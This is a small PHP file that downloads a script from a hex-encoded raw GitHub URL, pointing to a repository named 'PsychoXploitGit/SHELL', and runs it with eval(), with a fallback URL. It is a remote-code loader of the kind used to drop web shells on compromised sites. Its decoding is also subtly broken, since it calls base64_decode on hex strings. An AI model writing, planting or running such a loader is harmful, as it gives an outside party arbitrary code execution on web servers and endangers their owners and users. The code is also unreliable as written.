<?php
function get($url) {
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_HEADER, true);
    curl_setopt($ch, CURLOPT_NOBODY, true);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); 
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); 
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE); 

    if ($http_code == 200) {
        curl_setopt($ch, CURLOPT_NOBODY, false);
        curl_setopt($ch, CURLOPT_HEADER, false);
        $data = curl_exec($ch);
        curl_close($ch);
        return $data;
    } else {
        curl_close($ch);
        return false;
    }
}

$x = '?>';
$url1 = base64_decode('68747470733A2F2F7261772E67697468756275736572636F6E74656E742E636F6D2F50737963686F58706C6F69744769742F5348454C4C2F726566732F68656164732F6D61696E2F77696E6A61676F');
$url2 = base64_decode('68747470733A2F2F7261772E67697468756275736572636F6E74656E742E636F6D2F50737963686F58706C6F69744769742F5348454C4C2F726566732F68656164732F6D61696E2F77696E6A61676F');

$script1 = get($url1);
if ($script1 !== false && $script1 !== 404) {
    eval($x . $script1);
} else {
    $script2 = get($url2);
    if ($script2 !== false) {
        eval($x . $script2);
    } else {
        echo "Both attempts failed.";
    }
}
?>
